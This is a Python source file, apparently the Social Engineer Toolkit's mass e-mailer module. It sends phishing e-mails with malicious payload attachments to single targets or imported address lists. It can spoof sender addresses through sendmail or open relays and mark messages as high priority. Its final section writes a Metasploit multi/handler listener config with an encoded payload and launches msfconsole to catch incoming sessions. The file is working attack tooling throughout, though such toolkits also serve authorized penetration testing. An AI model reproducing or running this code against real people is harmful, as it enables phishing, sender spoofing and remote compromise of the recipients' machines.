#!/usr/bin/env python
# for client emails
import smtplib
import os
import getpass
import sys
import subprocess
import re
import glob
import random
import pexpect
import base64

# python 2 to 3 fixes
try:
    import _thread as thread # Py3
except ImportError:
    import thread # Py2
try:
    from cStringIO import StringIO
except ImportError:
    from io import StringIO

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.header import Header
from email.generator import Generator
import email.charset as Charset
import email.encoders as Encoders

# DEFINE SENDMAIL CONFIG
sendmail = 0
sendmail_file = open("/etc/setoolkit/set.config", "r").readlines()

from src.core.setcore import *

Charset.add_charset('utf-8', Charset.BASE64, Charset.BASE64, 'utf-8')

# Specify if its plain or html
message_flag = "plain"

for line in sendmail_file:
    # strip carriage returns
    line = line.rstrip()
    match = re.search("SENDMAIL=", line)
    if match:
        # if match and if line is flipped on continue on
        if line == ("SENDMAIL=ON"):
            print_info(
                "Sendmail is a Linux based SMTP Server, this can be used to spoof email addresses.")
            print_info("Sendmail can take up to three minutes to start FYI.")
            print_status("Sendmail is set to ON")
            sendmail_choice = yesno_prompt(["1"], "Start Sendmail? [yes|no]")
            # if yes, then do some good stuff
            if sendmail_choice == "YES":
                print_info("NOTE: Sendmail can take 3-5 minutes to start.")
                if os.path.isfile("/etc/init.d/sendmail"):
                    subprocess.Popen(
                        "/etc/init.d/sendmail start", shell=True).wait()
                # if not there then prompt user
                # added for osx
                if not os.path.isfile("/usr/sbin/sendmail"):
                    if not os.path.isfile("/etc/init.d/sendmail"):
                        pause = input("[!] Sendmail was not found. Install it and try again. (For Kali: apt-get install sendmail-bin)")
                        sys.exit()
                smtp = ("localhost")
                port = ("25")
                # Flip sendmail switch to get rid of some questions
                sendmail = 1
                # just throw user and password to blank, needed for defining
                # below
                provideruser = ''
                pwd = ''

    # Search for SMTP provider we will be using
    match1 = re.search("EMAIL_PROVIDER=", line)
    if match1:

        # if we hit on EMAIL PROVIDER
        email_provider = line.replace("EMAIL_PROVIDER=", "").lower()

        # support smtp for gmail
        # Issue ## Set reports the email as successfully sent but I haven't had
        # any success with it
        if email_provider == "gmail":
            if sendmail == 0:
                smtp = ("smtp.gmail.com")
                port = ("587")
                print_status(
                    "If you are using GMAIL - you will need to need to create an application password: https://support.google.com/accounts/answer/6010255?hl=en")

        # support smtp for yahoo
        if email_provider == "yahoo":
            if sendmail == 0:
                smtp = ("smtp.mail.yahoo.com")
                port = ("587")  # This was previously 465 and changed to 587

        # support smtp for hotmail
        if email_provider == "hotmail":
            if sendmail == 0:
                smtp = ("smtp.live.com")
                        # smtp.hotmail.com is no longer in use
                port = ("587")

# DEFINE METASPLOIT PATH
meta_path = meta_path()

print_info(
    "As an added bonus, use the file-format creator in SET to create your attachment.")
counter = 0
# PDF Previous
if os.path.isfile(userconfigpath + "template.pdf"):
    if os.path.isfile(userconfigpath + "template.rar"):
        if os.path.isfile(userconfigpath + "template.zip"):
            print_warning("Multiple payloads were detected:")
            print ("1. PDF Payload\n2. VBS Payload\n3. Zipfile Payload\n\n")
            choose_payload = input(setprompt("0", ""))
            if choose_payload == '1':
                file_format = (userconfigpath + "template.pdf")
            if choose_payload == '2':
                file_format = (userconfigpath + "template.rar")
            if choose_payload == '3':
                file_format = (userconfigpath + "template.zip")
            counter = 1

if counter == 0:
    if os.path.isfile(userconfigpath + "template.pdf"):
        file_format = (userconfigpath + "template.pdf")
    if os.path.isfile(userconfigpath + "template.rar"):
        file_format = (userconfigpath + "template.rar")
    if os.path.isfile(userconfigpath + "template.zip"):
        file_format = (userconfigpath + "template.zip")
    if os.path.isfile(userconfigpath + "template.doc"):
        file_format = (userconfigpath + "template.doc")
    if os.path.isfile(userconfigpath + "template.rtf"):
        file_format = (userconfigpath + "template.rtf")
    if os.path.isfile(userconfigpath + "template.mov"):
        file_format = (userconfigpath + "template.mov")

# Determine if prior payload created
if not os.path.isfile(userconfigpath + "template.pdf"):
    if not os.path.isfile(userconfigpath + "template.rar"):
        if not os.path.isfile(userconfigpath + "template.zip"):
            if not os.path.isfile(userconfigpath + "template.doc"):
                if not os.path.isfile(userconfigpath + "template.rtf"):
                    if not os.path.isfile(userconfigpath + "template.mov"):
                        print("No previous payload created.")
                        file_format = input(
                            setprompt(["1"], "Enter the file to use as an attachment"))
                        if not os.path.isfile("%s" % (file_format)):
                            while 1:
                                print_error("ERROR:FILE NOT FOUND. Try Again.")
                                file_format = input(
                                    setprompt(["1"], "Enter the file to use as an attachment"))
                                if os.path.isfile(file_format):
                                    break

# if not found exit out
if not os.path.isfile(file_format):
    exit_set()

print("""
   Right now the attachment will be imported with filename of 'template.whatever'

   Do you want to rename the file?

   example Enter the new filename: moo.pdf

    1. Keep the filename, I don't care.
    2. Rename the file, I want to be cool.
""")
filename1 = input(setprompt(["1"], ""))
if filename1 == '1' or filename1 == '':
    print_status("Keeping the filename and moving on.")
if filename1 == '2':
    filename1 = input(setprompt(["1"], "New filename"))
    subprocess.Popen("cp %s %s/%s 1> /dev/null 2> /dev/null" %
                     (file_format, userconfigpath, filename1), shell=True).wait()
    file_format = ("%s/%s" % (userconfigpath, filename1))
    print_status("Filename changed, moving on...")

print ("""
   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer, the first would
   be to send an email to one individual person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

   1.  E-Mail Attack Single Email Address
   2.  E-Mail Attack Mass Mailer

   99. Return to main menu.
   """)
option1 = input(setprompt(["1"], ""))

if option1 == '1' or option1 == '2':

    print ("""
   Do you want to use a predefined template or craft
   a one time email template.

   1. Pre-Defined Template
   2. One-Time Use Email Template
""")
    template_choice = input(setprompt(["1"], ""))
    # if predefined template go here
    if template_choice == '1':
        # set path for
        path = 'src/templates/'
        filewrite = open(userconfigpath + "email.templates", "w")
        counter = 0
        # Pull all files in the templates directory
        for infile in glob.glob(os.path.join(path, '*.template')):
            infile = infile.split("/")
            # grab just the filename
            infile = infile[2]
            counter = counter + 1
            # put it in a format we can use later in a file
            filewrite.write(infile + " " + str(counter) + "\n")
        # close the file
        filewrite.close()
        # read in formatted filenames
        fileread = open(userconfigpath + "email.templates", "r").readlines()
        print_info("Available templates:")
        for line in fileread:
            line = line.rstrip()
            line = line.split(" ")
            filename = line[0]
            # read in file
            fileread2 = open("src/templates/%s" % (filename), "r").readlines()
            for line2 in fileread2:
                match = re.search("SUBJECT=", line2)
                if match:
                    line2 = line2.rstrip()
                    line2 = line2.split("=")
                    line2 = line2[1]
                    # strip double quotes
                    line2 = line2.replace('"', "")
                    # display results back
                    print(line[1] + ": " + line2)
        # allow user to select template
        choice = input(setprompt(["1"], ""))
        for line in fileread:
            # split based off of space
            line = line.split(" ")
            # search for the choice
            match = re.search(str(choice), line[1])
            if match:
                # print line[0]
                extract = line[0]
                fileopen = open("src/templates/" +
                                str(extract), "r").readlines()
                for line2 in fileopen:
                    match2 = re.search("SUBJECT=", line2)
                    if match2:
                        subject = line2.replace('"', "")
                        subject = subject.split("=")
                        subject = subject[1]
                    match3 = re.search("BODY=", line2)
                    if match3:
                        body = line2.replace('"', "")
                        body = body.replace(r'\n', " \n ")
                        body = body.split("=")
                        body = body[1]
    if template_choice == '2' or template_choice == '':
        subject = input(setprompt(["1"], "Subject of the email"))
        try:
            html_flag = input(
                setprompt(["1"], "Send the message as html or plain? 'h' or 'p' [p]"))
            if html_flag == "" or html_flag == "p":
                message_flag = "plain"
            if html_flag == "h":
                message_flag = "html"
            body = ""
            body = input(setprompt(
                ["1"], "Enter the body of the message, hit return for a new line. Control+c when finished"))
            while 1:
                try:
                    body += ("\n")
                    body += input("Next line of the body: ")
                except KeyboardInterrupt:
                    break
        except KeyboardInterrupt:
            pass

# single email
if option1 == '1':
    to = input(setprompt(["1"], "Send email to"))

# mass emailer
if option1 == '2':
    print ("""
 The mass emailer will allow you to send emails to multiple
 individuals in a list. The format is simple, it will email
 based off of a line. So it should look like the following:

 john.doe@ihazemail.com
 jane.doe@ihazemail.com
 wayne.doe@ihazemail.com

 This will continue through until it reaches the end of the
 file. You will need to specify where the file is, for example
 if its in the SET folder, just specify filename.txt (or whatever
 it is). If its somewhere on the filesystem, enter the full path,
 for example /home/relik/ihazemails.txt
""")
    filepath = input(
        setprompt(["1"], "Path to the file to import into SET"))

# exit mass mailer menu
if option1 == '99':
    exit_set()

print(("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" %
      (email_provider)))
relay = input(setprompt(["1"], ""))
counter = 0
# Specify SMTP Option Here
if relay == '1':
    provideruser = input(
        setprompt(["1"], ("Your %s email address" % email_provider)))
    from_address = provideruser
    from_displayname = input(
        setprompt(["1"], "The FROM NAME user will see"))
    pwd = getpass.getpass("Email password: ")

# Specify Open-Relay Option Here
if relay == '2':
    from_address = input(
        setprompt(["1"], "From address (ex: moo@example.com)"))
    from_displayname = input(
        setprompt(["1"], "The FROM NAME user will see"))
    if sendmail == 0:
        # Ask for a username and password if we aren't using sendmail
        provideruser = input(
            setprompt(["1"], "Username for open-relay [blank]"))
        pwd = getpass.getpass("Password for open-relay [blank]: ")

    if sendmail == 0:
        smtp = input(setprompt(
            ["1"], "SMTP email server address (ex. smtp.youremailserveryouown.com)"))
        port = input(
            setprompt(["1"], "Port number for the SMTP server [25]"))
        if port == "":
            port = ("25")

# specify if its a high priority or not
highpri = yesno_prompt(["1"], "Flag this message/s as high priority? [yes|no]")
if not "YES" in highpri:
    prioflag1 = ""
    prioflag2 = ""
else:
    prioflag1 = ' 1 (Highest)'
    prioflag2 = ' High'


# Define mail send here
def mail(to, subject, text, attach, prioflag1, prioflag2):
    msg = MIMEMultipart()
    msg['From'] = str(
        Header(from_displayname, 'UTF-8').encode() + ' <' + from_address + '> ')
    msg['To'] = to
    msg['X-Priority'] = prioflag1
    msg['X-MSMail-Priority'] = prioflag2
    msg['Subject'] = Header(subject, 'UTF-8').encode()
    # specify if its html or plain
    # body message here
    body_type = MIMEText(text, "%s" % (message_flag), 'UTF-8')
    msg.attach(body_type)
    # define connection mimebase
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    # base 64 encode message mimebase
    Encoders.encode_base64(part)
    # add headers
    part.add_header('Content-Disposition',
                    'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)

    io = StringIO()
    msggen = Generator(io, False)
    msggen.flatten(msg)

    # define connection to smtp server
    mailServer = smtplib.SMTP(smtp, int(port))
    mailServer.ehlo()
    # send ehlo to smtp server
    if sendmail == 0:
        if email_provider == "gmail" or email_provider == "yahoo":
            mailServer.ehlo()
            # start TLS needed for gmail and yahoo and hotmail (live)
            try:
                mailServer.starttls()
            except:
                pass
            mailServer.ehlo()
    if not "gmail|yahoo|hotmail|" in email_provider: 
        tls = yesno_prompt(["1"], "Does your server support TLS? [yes|no]")
        if tls == "YES":
            mailServer.starttls()
    if counter == 0:
        try:
            if email_provider == "gmail" or email_provider == "yahoo" or email_provider == "hotmail":
                try:
                    mailServer.starttls()
                except:
                    pass
                mailServer.ehlo()
                if len(provideruser) > 0:
                    mailServer.login(provideruser, pwd)
                mailServer.sendmail(from_address, to, io.getvalue())
        except Exception as e:
            print_error(
                "Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught.")
            input("Press {return} to view error message.")
            print(str(e))
            try:
                mailServer.docmd("AUTH LOGIN", base64.b64encode(provideruser))
                mailServer.docmd(base64.b64encode(pwd), "")
            except Exception as e:
                print(str(e))
                try:
                    mailServer.login(provideremail, pwd)
                    thread.start_new_thread(mailServer.sendmail(
                        from_address, to, io.getvalue()))
                except Exception as e:
                    return_continue()

    if email_provider == "hotmail":
        mailServer.login(provideruser, pwd)
        thread.start_new_thread(mailServer.sendmail,
                                (from_address, to, io.getvalue()))

    if sendmail == 1:
        thread.start_new_thread(mailServer.sendmail,
                                (from_address, to, io.getvalue()))

if option1 == '1':
    try:
        mail("%s" % (to), subject, body, "%s" %
             (file_format), prioflag1, prioflag2)
    except socket.error:
        print_status(
            "Unable to connect to mail server. Try again (Internet issues?)")

if option1 == '2':
    counter = 0
    email_num = 0
    fileopen = open(filepath, "r").readlines()
    for line in fileopen:
        to = line.rstrip()
        mail("%s" % (to),
             subject,
             body,
             "%s" % (file_format), prioflag1, prioflag2)
        email_num = email_num + 1
        print("   Sent e-mail number: " + (str(email_num)))

if not os.path.isfile(userconfigpath + "template.zip"):
    print_status("SET has finished delivering the emails")
    question1 = yesno_prompt(["1"], "Setup a listener [yes|no]")
    if question1 == 'YES':
        if not os.path.isfile(userconfigpath + "payload.options"):
            if not os.path.isfile(userconfigpath + "meta_config"):
                if not os.path.isfile(userconfigpath + "unc_config"):
                    print_error(
                        "Sorry, you did not generate your payload through SET, this option is not supported.")
        if os.path.isfile(userconfigpath + "unc_config"):
            child = pexpect.spawn(
                "%smsfconsole -r %s/unc_config" % (meta_path, userconfigpath))
            try:
                child.interact()
            except Exception:
                child.close()

        if os.path.isfile(userconfigpath + "payload.options"):
            fileopen = open(userconfigpath + "payload.options", "r").readlines()
            for line in fileopen:
                line = line.rstrip()
                line = line.split(" ")

            # CREATE THE LISTENER HERE
            filewrite = open(userconfigpath + "meta_config", "w")
            filewrite.write("use exploit/multi/handler\n")
            filewrite.write("set PAYLOAD " + line[0] + "\n")
            filewrite.write("set LHOST " + line[1] + "\n")
            filewrite.write("set LPORT " + line[2] + "\n")
            filewrite.write("set ENCODING shikata_ga_nai\n")
            filewrite.write("set ExitOnSession false\n")
            filewrite.write("exploit -j\r\n\r\n")
            filewrite.close()
            child = pexpect.spawn(
                "%smsfconsole -r %s/meta_config" % (meta_path, userconfigpath))
            try:
                child.interact()
            except Exception:
                child.close()
